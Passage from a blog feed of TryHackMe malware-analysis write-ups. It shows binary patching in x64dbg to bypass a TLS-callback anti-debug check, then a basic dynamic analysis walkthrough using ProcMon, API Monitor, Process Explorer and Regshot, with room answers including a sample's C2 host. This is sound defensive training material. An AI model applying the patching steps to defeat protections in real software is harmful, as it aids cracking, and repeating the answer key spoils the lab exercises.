id="task-6---bypassing-unwanted-execution-path">Task 6 - Bypassing unwanted execution path</h2> <p>When we reload the crackme and run it one time, we come across the TLS callback again.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/ByXpL8xaR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="TLS Callback" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>In order to make a <code class="language-plaintext highlighter-rouge">jne/jnz</code> jump, we need to set the zero flag ZF to 0. Because the two previous values compared were the same, the ZF was set to 1.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/rku9tLlpA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Changing ZF" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>This manipulation with the debugger will make us pass the TLS Callback and make us jump over the evasion detection. This is very practical to use, especially for first time analysis.<br/> Due to the nature of changing a value, restarting our program would make the ZF flag return to value 1. This is time to use patching, which will change the instructions of the program directly into the file.</p> <p>In our situation, we have multiple choices to bypass this:</p> <ul> <li>Change <code class="language-plaintext highlighter-rouge">jne</code> instruction for a <code class="language-plaintext highlighter-rouge">je</code> one</li> <li>Use a unconditionnal jump</li> <li>Fill instructions with NOPs (No operation instruction)</li> <li>and more …</li> </ul> <p>Here we will change <code class="language-plaintext highlighter-rouge">jne</code> to <code class="language-plaintext highlighter-rouge">je</code>. To edit that instruction, we right-click on it, then use <em>Assemble</em> or just use <em>Space</em> on that instruction:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/BkT43Ig6A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Assemble button" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/H13v0IeaA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Changing assembly instructions" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>By changing this parameter, we have successfully bypassed this TLS callback:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/ryRWRLep0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="TLS Callback bypassed" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>For the <em>Fill with NOPs</em> option, we use the suggested option by x86dbg by going to <em>Binary &gt; Fill with NOPs</em> it:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/B1XTALxT0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Fill with NOPs option" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Below is what we get by filling with NOPs. There is 5 <code class="language-plaintext highlighter-rouge">nop</code> instructions because we need to have the same instruction size as before the patch in order to preserve the statically contained memory addresses.</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/r1QUWPeTR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Filling with NOPs result" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The issue with patching a binary is that we need to save it on disk. To patch and export definitely the binary, we go to <em>File &gt; Patch</em> or <em>Ctrl + P</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/SkjQlwgpA.png" class="img-fluid rounded z-depth-1" width="70%" height="auto" title="Patch a binary" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Now, when we go to our patched binary at the same address, we always get the <code class="language-plaintext highlighter-rouge">je</code> instruction even if we reload the program:</p> <figure> <picture> <img src="/assets/img/images/thm_dynamic_analysis_debugging/S1f3ZPgp0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Patched program" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="question">Question</h3> <p><strong>What is it called when a binary’s assembly code is permanently altered to get the desired execution path?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Patching</code></em></p> <h2 id="task-7---conclusion">Task 7 - Conclusion</h2> <p>That was it for this room. In this room, we learned the following:</p> <ul> <li>Common techniques to evade static and basic dynamic malware analysis.</li> <li>The use of debuggers for deeper analysis of malware.</li> <li>Using debuggers for changing the environment at runtime.</li> <li>Using debuggers to patch malware samples.</li> </ul> <p>However, this is not covering all the techniques available. Malware authors also use many techniques to evade dynamic analysis and debugging.</p> <h2 id="references">References</h2> <p><a href="https://www.varonis.com/blog/how-to-use-x64dbg">https://www.varonis.com/blog/how-to-use-x64dbg</a> <a href="https://tryhackme.com/r/room/advanceddynamicanalysis">https://tryhackme.com/r/room/advanceddynamicanalysis</a></p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="RE"/><category term="Dynamic Analysis"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Basic Dynamic Analysis</title><link href="https://nonohm.github.io/blog/2024/THM-Basic-Dynamic-Analysis/" rel="alternate" type="text/html" title="THM Basic Dynamic Analysis"/><published>2024-07-24T16:05:21+00:00</published><updated>2024-07-24T16:05:21+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Basic-Dynamic-Analysis</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Basic-Dynamic-Analysis/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>Previously, we learned techniques to analyze malware without executing it in the Basic Static Analysis room. As we have seen, malwares can use techniques to hide its features from a malware analyst. However, their purpose is to execute, thus traces are left behind when a malware is executed, which can give us some indications about the functions it is using. We will use basic dynamic analysis techniques here to analyze them.</p> <h3 id="learning-objectives">Learning Objectives</h3> <p>In this room, we will learn about:</p> <ul> <li>Sandboxing and using a sandbox for malware analysis</li> <li>The components of a sandbox how to create one ourselves</li> <li>Using ProcMon to monitor a process’ activity</li> <li>Using API LOgger and API Monitor to identify API calls made by malware</li> <li>Using ProcExp to identify if a process is modified maliciously</li> <li>Using Regshot to track registry changes made by malware</li> </ul> <h3 id="pre-requisties">Pre-requisties</h3> <p>Before starting this room, it is recommended to complete the following room for a better understanding:</p> <ul> <li><a href="https://tryhackme.com/room/windowsapi">Introduction to Windows API</a></li> <li><a href="https://tryhackme.com/room/windowsinternals">Windows Internals</a></li> <li><a href="https://tryhackme.com/room/intromalwareanalysis">Intro to Malware Analysis</a></li> <li><a href="https://tryhackme.com/room/staticanalysis1">Basic Static Analysis</a></li> </ul> <h2 id="task-2---sandboxing">Task 2 - Sandboxing</h2> <p>In all the malware anlysis rooms, it has been emphasized that malware sould only be analyzed in a controlled environment, ideally a VM. However, this becomes increasingly important for the dynamic analysis of malware.</p> <p>So, what is required to create a sandbox ?</p> <ol> <li>An isolated machine, ideally a Virtual Machine that is not connected to live/production systems and is dedicated to malware analysis</li> <li>The ability for the machine to save its initial state and revert to it once the malware analysis is complete like snapshots.</li> <li>Monitoring tools that help us analyze the malware whil it is executing. These can be automated as we see in automated sandboxes or manual, requiring the anayst to interact while performing analysis.</li> <li>A file-sharing mechanism that is used to introduce the malware into the environment and sends the analysis data/report to us. Often, shared directories or network drives are used but must be unmounted when executing the malware, especially for ransomwares.</li> </ol> <h3 id="virtualization">Virtualization</h3> <p>A lot of tools are available for virtualization. The main ones are:</p> <ul> <li>Oracle’s VirtualBox (free)</li> <li>VMWare’s Workstation (paid)</li> </ul> <p>VMWare Player is not suited for sandboxing because it can not create snapshots, which is a critical requirement for dynamic analysis.</p> <p>Apart from these, server-based virtualization software like WenServer, QEmu, ESXi… help with virtualization on a dedicated server. This type of setup is often used by enterprises for their virtualization needs and security reaserch organizations often use similar technologies to create a VM farm for large-scale virtualization.</p> <p>The VM’s OS needs to be the same as the malware’ target OS for dynamic analysis. In most scenarios, this will be Windows, and we will be covering tools related to Windows in this room.</p> <h3 id="analysis-tools">Analysis Tools</h3> <p>Once we have a VM, we need some analysis tools. It is possible to use packages made for RE like <a href="https://github.com/mandiant/flare-vm">Flare VM</a> or <a href="https://remnux.org/">REMnux</a>. Automated malware analysis systems have some built-in tools that analyze malware behaviour, like in <a href="https://cuckoosandbox.org/">Cuckoo sandbox</a> with <em>cuckoomon</em>. When all tools are installed, it is a must to take snapshot. It will ensure we have a clean state that we can revert and ensure our analysis is not contaminated by different malware samples running simultaneously.</p> <h3 id="file-sharing">File-sharing</h3> <p>Different platforms provide different options for sharing file between host and guest OS. In the most popular tools like <em>VirtualBox</em> or <em>VMWare Workstation</em>, the following options are common:</p> <ul> <li>Shared folder</li> <li>Create an iso and mounting it to the VM</li> <li>Clipboard copy and paste</li> </ul> <p>Apart from these, running a web server on the guest where malware samples can be uploaded or mounting a removable drive to the VM is possible. Note that the more isolated the option to share files is, the safer it will be for the host OS. apart for sharing malware, this option is also used to extract analysis reports from the VM.</p> <h3 id="question">Question</h3> <p><strong>If an analyst wants to analyze Linux malware, what OS should their sandbox’s Virtual Machine have?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">linux</code></em></p> <h2 id="task-3---procmon">Task 3 - ProcMon</h2> <p>In this task, we will learn how to use <strong>Process Monitor</strong>, or ProcMon to analyze malwares’ activities. ProcMon is a part of the Sysinternals suite, a set of utilities that provides advanced funcitonalities for Windows. They are widely used in security research and we will cover some of them in this room.</p> <p>Once <em>procmon.exe</em> is launched, the following window will apear:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/HkXprZUtR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="ProcMon Window" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <ol> <li>Shows the <em>Open</em> and <em>Save</em> options. These options are for opening a file that contains ProcMon events or saving the events to a supported file.</li> <li>Shows the <em>Clear</em> option to clear all the events currently being shown by ProcMon. It is good to clear the events once we execute a malware sample of interest to reduce noise.</li> <li>Shows the <em>Filter</em> option to have further control over the events shown in the window.</li> <li>These are the toggle buttons to turn on/off <em>Registry, FileSystem, Network, Process/Thread and Profiling</em> events.</li> </ol> <p>Below these conrtols, we can ee from the left to the right the <em>Time, Process, Process ID (PID), Event Name, Path, Result and Details</em> of the activity. Events are shown in chronological order and ProcMon will show an overwhelming number of events occuring on the system by monitoring every system activity. That is why filtering is important for ease of analysis.</p> <h3 id="filtering-events">Filtering Events</h3> <p>An easy way of filtering events is to filter from the events window itself.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/HJHXYZIYA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="ProcMon Filtering Events" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>By right clicking on the <em>Process Name</em> column of the process of our choice, a pop-up menu appears and some options are related to filtering. If we choose <code class="language-plaintext highlighter-rouge">Include 'Explorer.EXE'</code>, ProcMon will only show events with <em>Process Name</em> Explorer.exe. The opposite is available for <code class="language-plaintext highlighter-rouge">Exclude Explorer.EXE</code>; it will exclude Explorer.exe from the results.</p> <p>Similarly, we can filter other options by right-clicking on the corresponding columns (PID, Operation, Path…).</p> <h3 id="advanced-filtering">Advanced Filtering</h3> <p>Advanced filters are available on the menu marked as 3 on the above screenshot. When clicking on this, we will se the following pop-up:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/HkdZtWIKA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="ProcMon Advanced Filtering" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>We can see some preset filters are already applied for filtering out some of the tools from the Sysinternals Suite. Furthermore, filtering is quite simple to implement; we select filtering values like <em>Process Name</em>, its relation, value and action. If the checkbox is ticked, the filter is applied, otherwise it is not.</p> <h3 id="process-tree">Process Tree</h3> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/BkxyE4UKR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="pt icon" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/SkqxVELKA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Process Tree" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions">Questions</h3> <p><strong>Monitor the sample <code class="language-plaintext highlighter-rouge">~Desktop\Samples\1.exe</code> using ProcMon. This sample makes a few network connections. What is the first URL on which a network connection is made?</strong></p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/rJJrKVUFC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="1.exe Filters" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Here, we are using filters for the Process Name and the Event Class to only filter the sample <em>1.exe</em> and the network connection the malware wants to make.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/ByHGtV8tR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="1.exe Network Events" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">94-73-155-12.cizgi.net.tr:2448</code></em></p> <p><strong>What network operation is performed on the above-mentioned URL?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">TCP Reconnect</code></em></p> <p><strong>What is the name with the complete full path of the first process created by this sample?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop\samples\1.exe</code></em></p> <h2 id="task-4---api-logger-and-api-monitor">Task 4 - API Logger and API Monitor</h2> <p>The Windows OS abstracts the hardware interaction to the user by providing an Application Programmable Interface (API) for performing all tasks. For example, there is an API to create files, another to create process, and so on. Therefore, one way to identify malware behaviour is to monitor which API calls a malware do. While API’s names are generally self-exlpanatory, <a href="https://learn.microsoft.com/en-us/windows/win32/api/">MSDN Documentation</a> can be referred for finding more information.</p> <p>In this task, we will learn more about API logger and API monitor which can help us identify what API calls malware is making.</p> <h3 id="api-logger">API Logger</h3> <p><strong>API Logger</strong> is a simple tool that provides basic information about APIs called by a process. The main window is depicted below:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/ry1-Qw8FA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="API Logger Window" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>To open a new process, we can provide the path of the executable or search for it using the three-dot menu.<br/> Moreover, an existing process can be monitored by providing its PID. The following window will appear:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/ry9HEDUt0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="API Logger PID" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Once this is done, we can click <em>Inject &amp; Log</em> to start the API logging process. API calls are logged on the lower pane and running processes on the upper one.</p> <h3 id="api-monitor">API Monitor</h3> <p><strong>API Monitor</strong> provides more advanced information about a process’s API calls. It has a 32-bit and 64-bit version for each architecture of a process respectively. When API Monitor is open, we see the following window:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/B1Jzrv8F0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="API Monitor Window" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>As we can see, API Monitor has multiple tabs, as numbered in the image above:</p> <ol> <li>This tab is a filter for the API group we want to monitor. For example, there is <em>Graphics and Gaming</em> related APIs, another one for <em>Internet</em>…</li> <li>This tab shows the processes being monitored for API calls. <em>Monitor New Process</em> option start monitoring a new process.</li> <li>This tab shows the <em>API call</em>, the <em>Module</em>, the <em>Thread</em>, <em>Time</em>, <em>Return Value</em> and any errors. We can monitor this tab for APIs called by a process.</li> <li>This tab show processes that can be monitored.</li> <li>This tab shows the <em>Parameters</em> of the API call, including those before and after the API processing.</li> <li>This tab show the Hex buffer of the selected value.</li> <li>This tab shows the Call Stack of the process.</li> <li>This tab shows the ouput.</li> </ol> <p>To understand it better, let’s open a new process. This is what we get when we use the <em>Monitor New Process</em> option in tab 2:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/B1QbFvUFA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="API Monitor New Process" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>In this menu, we can select the process from a path, any arguments the process takes, the directory from where we want to start the process and the method for attaching API Monitor. Most of the time we can ignore the <em>Arguments</em> and <em>Start</em> option.</p> <p>Once we open a process, we see the tabs populate as seen below:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/Byf_3DLtR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="API Monitor Running" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <ul> <li>In tab 1, we see the API filtering selecting all values to monitor all API calls.</li> <li>In tab 2, we see the path of the process we are monitoring.</li> <li>In tab 3, we see a summary of the API calls. The highlighted API call is <code class="language-plaintext highlighter-rouge">RegOpenKeyExW</code>. Hence we know that the process tried to open a registry key and the result is an error which can be interpreted as <em>registry key not found</em>.</li> <li>Tab 5 show tje parameters of the API call from before and after the API call was made.</li> <li>Tab 6 show the selected value in hex.</li> <li>Tab 7 show the Call Stack of the process.</li> </ul> <p>We see that <strong>API Monitor</strong> provides us with much more information about API calls by a process than <strong>API Logger</strong>. However, we must slow down the analysis process to digest all this information. When analyzing malware, we can decide whether to use API Logger or API Monitor based on our needs.</p> <h3 id="questions-1">Questions</h3> <p><strong>The sample <code class="language-plaintext highlighter-rouge">~Desktop\samples\1.exe</code> creates a file in the <code class="language-plaintext highlighter-rouge">C:\</code> directory. What is the name with the full path of this file?</strong></p> <p>To start with, we are going to monitor this sample with APILogger beceause of it is more readable.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/Hyj67O8tC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="API Logger 1.exe" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">C:\myapp.exe</code></em></p> <p><strong>What API is used to create this file?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">CreateFileA</code></em></p> <p><strong>In Question 1 of the previous task, we identified a URL to which a network connection was made. What API call was used to make this connection?</strong></p> <p>By looking a bit further on the logs, we can see the API calls made to create a connection with a unknown computer:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/Byt1ruUKC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Internet API Call" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">InternetConnectW</code></em></p> <p><strong>We noticed in the previous task that after some time, the sample’s activity slowed down such that there was not much being reported against the sample. Can you look at the API calls and see what API call might be responsible for it?</strong></p> <p>Futrthermore, we can also deduct a loop at the connection stage that is slowed down with <code class="language-plaintext highlighter-rouge">sleep()</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/HJ19SuIFR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Connection loop" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">sleep</code></em></p> <h2 id="task-5---process-explorer">Task 5 - Process Explorer</h2> <p><strong>Process Explorer</strong> is another tools from the Sysinternals Suite. It can be considered as an advanced Windows Task Manager that can help us identify process hollowing and masquereading techniques.<br/> This is what Process Explorer looks like:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/HJPxXTvKR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Process Explorer Window" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The above screenshot shows all the different processes running in the system in a tree format. We can see their <em>CPU utilization, Memory usage, Process ID (PID), Description and Company Name</em>.<br/> We can enable the lower pane view from the <em>View</em> menu to find more information about the selected process. When enabled, we get the following screenshot:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/rkjTXaPtR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Process Explorer View" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>On the lower pane, we can see details about the process, such as:</p> <ul> <li><strong>Handles</strong>: References to various system ressources the process is using like threads, files, <a href="https://www.techtarget.com/searchnetworking/definition/mutex">mutexes</a> (mutual exclusions used to manage concurent access to ressources), <a href="https://learn.microsoft.com/en-us/windows/win32/sync/semaphore-objects">semaphores</a> (signaling between threads) or sections (memory sections or shared memory)…</li> <li><strong>DLLs</strong>: Imported DLLs used by the process</li> <li><strong>Threads</strong>: Part of a program that runs tasks at the same time as other parts.</li> </ul> <p>By informing us about the ressources being used in the process, if a new process or thread in another process is opened by a process, it can indicate code injection into that process.</p> <p>For more details about a selected process, we can look at the properties of the process. We can do that by right-clicking the process name in the process tree and selecting <em>Properties</em>. We should see something like this:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/Bk3BDpvt0.png" class="img-fluid rounded z-depth-1" width="70%" height="auto" title="Process Explorer 3.exe Properties" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="process-masquereading">Process Masquereading</h3> <p>As seen in the above screenshot, the properties function show us a lot of information about a process in different tabs. Malware authors sometimes use process names similar to Windows legit ones or commonly used software to hide from an analyst’s prying eyes. The <em>Image</em> tab helps an analyst defeat this technique by clicking on the <em>Verify</em> button on this tab to identify if the executable for the running process is signed by the relevant organization, which shall be Microsoft in the case of Windows binaries.<br/> In this particular screenshot, we see the text <em>(No signature was present in the subject) Microsoft Corporation</em>, which means although the executable claims to be from Microsoft, it is not digitally signed by them and is spoofing a Microsoft process. This can be an indication of a malicious process.</p> <p>We must note that this verification only applies to the process’ image stored on the disk, hence a signed hollowed process migth still get a verified signature for that process. To identify hollowed process we have to look somewhere else.</p> <h3 id="process-hollowing">Process Hollowing</h3> <p>Another technique used by malware is Process Hollowing, that means the malware binary hollow an already running legitimate process by removing all its code from its virtual memory and inject malicious code instead. This way, an analyst should see a legitimate process that run the code of a malware author.</p> <p>To try to find this technique, we could use the <em>String</em> tab in a process’ properties like shown below:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/rJGli6wFA.png" class="rounded z-depth-1" width="70%" height="auto" title="5.exe Process Strings" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>At the bottom of the screenshot, we can choose <em>Image</em> and <em>Memory</em> options.</p> <ul> <li><strong>Image</strong>: Shows strings present in the disk image of the process.</li> <li><strong>Memory</strong>: Show strings extracted from the process’ memory.</li> </ul> <p>Normally, strings contained in the image should be the same as the process located in memory. However, we should see a significant difference between these two in an hollowed process.</p> <h3 id="questions-2">Questions</h3> <p><strong>What is the name of the first Mutex created by the sample <code class="language-plaintext highlighter-rouge">~Desktop\samples\1.exe?</code> If there are numbers in the name of the Mutex, replace them with X.</strong></p> <p>Firstly, we need to open the lower pane and <em>Handles</em> tab after executing the binary. By scrolling down a bit, it shows the different mutexes:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/Ske5haDt0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="1.exe handles mutexes" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">\Sessions\X\BaseNamedObjects\SMX:XXXX:XXX:WilStaging_XX</code></em></p> <p><strong>Is the file signed by a known organization? Answer with Y for Yes and N for No.</strong></p> <p>In order to check the signature, we will go into the <em>1.exe</em> properties:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/Hk78apvY0.png" class="img-fluid rounded z-depth-1" width="70%" height="auto" title="1.exe properties" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">N</code></em></p> <p><strong>Is the process in the memory the same as the process on disk? Answer with Y for Yes and N for No.</strong></p> <p>To check if the process is being hollowed out, we have to see the process’ strings:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/SkGe0pwFR.png" class="img-fluid rounded z-depth-1" width="70%" height="auto" title="1.exe strings image" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/S1D7CTPtC.png" class="img-fluid rounded z-depth-1" width="70%" height="auto" title="1.exe strings memory" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>As we see, the process might not being hollowed out but the binary file might be packed.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">N</code></em></p> <h2 id="task-6---regshot">Task 6 - Regshot</h2> <p><strong>Regshot</strong> is a tool that identfies any changes to the registry (or filesystem we select). It is mainly used to identify what registry keys were created, deleted or modified during our dynamic analysis.<br/> Regshot works by taking snapshots of the registry before and after the execution of malware to compare them and identify the differences between the two.</p> <p>When we execute Regshot, we see the following interface:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/S1MPulqFC.png" class="img-fluid rounded z-depth-1" width="50%" height="auto" title="Regshot Interface" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>In this simple interface, we can also scan for change in the filsystem if we select the scan <em>dir1</em> option. However, only registry changes will be covered here.<br/> To start, we can click on <em>1st shot</em> option. It will ask us whether to <em>take a shot</em> or <em>take a shot and save</em>. Once the first shot is taken, we should see something like below:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/rkSPFl5KC.png" class="img-fluid rounded z-depth-1" width="55%" height="auto" title="Regshot 1st shot" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Now we have saved a shot of the registry, we can execute the malware. Once the malware has been executed sucessfully, we take a <em>2nd shot</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/BkuiqgcKR.png" class="img-fluid rounded z-depth-1" width="55%" height="auto" title="Regshot 2nd shot" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Now, we should be able to compare and see significant changes done to the registry by the malware. Using the <em>Compare</em> button, a summary box should appear:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/SkmWox5KC.png" class="img-fluid rounded z-depth-1" width="60%" height="auto" title="Regshot Compare" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>While the summary show <em>Keys</em> and <em>Values</em> that were added, deleted and modified to the registry, it also show changes done to the Files and Folders. However, since we have not checked the <em>Scan dir1</em> option, zero changes appear. Changes would appear if this box was activated.<br/> To save the results, we have to go to <em>Compare &gt; Output</em>. It provides <em>the date and time of the shots, the computer name, the username and regshot’s version</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/S1SXhx5Y0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Regshot Output Comparison" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Once advantage that Regshot enjoys over all tools discussed in this room is that it doesn’t need to be running when we execute the malware, by being able to save the shot before. Some malware can check all the running processes and shut down if any analysis tool is running like <em>ProcExp, Procmon or API Monitor</em>. They check for them before running the rogue payload and quitting if these are found.<br/> Its core mechanism makes it immune to detection evasion. However, we must ensure that no other processes is running in the background while perofrming analysis with regshot, as there is no filtering mechanism, like in the other tools. Hence, any noise created by background process will also be recorded by Regshot, resulting in False Positives.</p> <h3 id="question-1">Question</h3> <p><strong>Analyze the sample <code class="language-plaintext highlighter-rouge">~Desktop\Samples\3.exe</code> using Regshot. There is a registry value added that contains the path of the sample in the format *HKU\S-X-X-XX-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXX-XXX*. What is the path of that value after the format mentioned here?</strong></p> <p>Firstly, we need to run regshot and take a 1st shot of our system state.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/S1XK0mqF0.png" class="img-fluid rounded z-depth-1" width="60%" height="auto" title="Regshot 1st shot" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Then, we run the malware <code class="language-plaintext highlighter-rouge">3.exe</code>. We should be able to see it in <em>procexp</em> or <em>procmon</em> beceause it does not do some Evasion Detection.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/rkmjkEqKR.png" class="img-fluid rounded z-depth-1" width="70%" height="auto" title="Process Explorer 3.exe" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>After doing a second shot, we get a new summary window about it:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/ry2mgEcK0.png" class="img-fluid rounded z-depth-1" width="60%" height="auto" title="Regshot 2nd shot" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Finally, we compare using the corresponding button and we check for the requested regkey starting with <em>HKU</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_dynamic_analysis/r1L92VqK0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="3.exe reg path" loading="lazy" 